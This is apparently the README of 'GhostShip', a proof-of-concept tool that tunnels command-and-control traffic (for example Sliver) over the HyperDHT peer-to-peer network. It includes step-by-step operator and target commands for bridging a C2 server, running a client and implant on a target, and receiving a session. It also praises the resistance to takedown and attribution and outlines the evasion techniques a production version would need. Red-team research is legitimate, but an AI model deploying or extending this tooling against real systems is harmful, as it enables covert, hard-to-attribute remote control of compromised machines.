# GhostShip 👻🚢

## P2P Tunnel for C2 Traffic

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Status: Proof of Concept](https://img.shields.io/badge/Status-PoC-orange.svg)](#)

---

> **⚠️ Proof of Concept** — This project validates P2P transport feasibility only. It is not operationally viable and will be detected by EDR/XDR.

---

## Overview

**GhostShip** is a proof-of-concept peer-to-peer (P2P) tunnel designed to transport C2 traffic (such as [Sliver](https://github.com/BishopFox/sliver)) through the [HyperDHT](https://github.com/holepunchto/hyperdht) network.

By utilizing [HyperDHT](https://docs.pears.com/building-blocks/hyperdht) from the [Pear](https://pears.com/) / [Holepunch](https://holepunch.to/) ecosystem, GhostShip allows C2 traffic to traverse the internet via a decentralized DHT, bypassing the need for public IPs, static domains, or traditional VPS infrastructure.

---

## How It Works

```
[Target Machine]                              [Operator Machine]

  C2 Implant                                    C2 Server
  (e.g., Sliver)                               (e.g., Sliver)
       |                                            |
       v                                            v
  127.0.0.1:8888                              127.0.0.1:8888
       |                                            |
       v                                            v
  GhostShip Client  <------P2P/DHT------>  GhostShip Bridge
```

**Data Flow:**
1. Operator starts their C2 server (e.g., Sliver with mTLS listener on port 8888)
2. Operator runs the **Bridge**, which connects to the local C2 server and exposes it via HyperDHT
3. Bridge generates a connection key (`hs://...`)
4. On the target, the **Client** connects to the DHT using the connection key
5. Client opens a local TCP port (default: 8888) for the implant to connect to
6. C2 implant connects to `127.0.0.1:8888` and traffic flows through the P2P tunnel

---

## Traditional C2 vs Native P2P C2

The comparison below is between **traditional centralized C2** and a **hypothetical native P2P C2** (not this PoC).

| Aspect | Traditional C2 | Native P2P C2 |
|--------|---------------|---------------|
| **Topology** | Star (clients → central server) | Mesh (peer-to-peer via DHT) |
| **Infrastructure** | VPS, domains, static IPs required | Zero infrastructure - DHT is public |
| **Cost** | $10-100+/month (VPS, domains, CDN) | Free (leverages existing DHT network) |
| **Setup time** | Hours/days (provisioning, DNS propagation) | Seconds (generate key, connect) |
| **Single point of failure** | Server takedown = total loss | No central server to seize |
| **Attribution risk** | Domain WHOIS, IP registration, hosting logs | Lower - DHT provides anonymity layer |
| **Sinkholing** | Domains can be seized | No DNS = nothing to sinkhole |
| **Takedown** | Single target (your server) | No central point to take down |
| **IP rotation** | Manual or requires infrastructure | Automatic via DHT routing |
| **Geoblocking** | Server IP can be blocked | DHT nodes globally distributed |
| **NAT traversal** | Requires port forwarding or redirectors | Built-in hole-punching |
| **Encryption** | Implementation-dependent | E2E by default (Noise protocol) |
| **Certificate management** | Required for HTTPS/mTLS | Not needed - key-based identity |
| **Redundancy** | Requires multiple servers | Inherent in DHT mesh |
| **Latency** | Low, predictable | Higher, variable (DHT routing) |
| **Offline queuing** | Server can store commands | No - both peers must be online |
| **Bootstrap dependency** | None | DHT bootstrap nodes required (blockable) |
| **Traffic fingerprint** | Known IPs/domains fingerprintable | DHT traffic patterns also detectable |
| **Protocol signature** | JA3/JA3S fingerprintable | Noise protocol also has signature |
| **Tooling maturity** | Established ecosystem | Emerging, limited tooling |
| **Multi-operator** | Teamserver features available | Requires custom implementation |
| **Debugging** | Straightforward | Complex (distributed system) |

**Bottom line:** P2P eliminates infrastructure costs and single points of failure, but introduces latency, requires both peers online, and depends on DHT bootstrap nodes. Traditional C2 is mature with established tooling but requires operational security for infrastructure. Neither is inherently "better" — choose based on your threat model and operational requirements.

---

## About This PoC

GhostShip demonstrates that HyperDHT can successfully transport C2 traffic. It's a Node.js wrapper around existing C2 infrastructure — useful for research and experimentation, but not suitable for real operations.

A production-grade native P2P C2 would require building from scratch: small native binary, process injection or hollowing for stealth, in-memory IPC instead of visible local ports, and proper evasion techniques (AMSI/ETW bypass, anti-forensics, syscall unhooking).

This PoC has none of that. It runs visible Node.js processes, opens detectable TCP ports, has a ~70MB footprint due to embedded runtime, and includes zero evasion capabilities. Any competent EDR/XDR will flag it immediately.

---

## Quick Start

### 1. Clone and Build

```bash
git clone https://github.com/bitsalv/ghostship.git
cd ghostship
```

### 2. Operator Side

**Start your C2 server:**
```bash
# Example with Sliver
sliver-server
sliver > mtls --lport 8888
```

**Start the GhostShip Bridge:**
```bash
cd bridge/nodejs
npm install
node bridge.js --port 8888
# Note the connection key: hs://abc123...
```

### 3. Target Side

**Start the GhostShip Client:**
```bash
cd client
npm install
node client.js --connect "hs://abc123..." --port 8888
```

**Run your C2 implant configured to connect to `127.0.0.1:8888`:**
```bash
# Example: Sliver implant generated with:
# generate --mtls 127.0.0.1:8888 --os linux --arch amd64
./implant
```

### 4. Receive Session

```
sliver > sessions
```

---

## Project Structure

```
ghostship/
├── bridge/
│   └── nodejs/
│       ├── bridge.js        # Bridge implementation
│       └── package.json
├── client/
│   ├── client.js            # Client implementation
│   └── package.json
└── .github/
    └── workflows/
        └── release.yml      # CI/CD pipeline
```

---

## Disclaimer

This project is for **authorized security research and educational purposes only**.

Unauthorized access to computer systems is illegal. Always obtain proper authorization before testing.

---

## License

MIT License - See [LICENSE](LICENSE) for details.
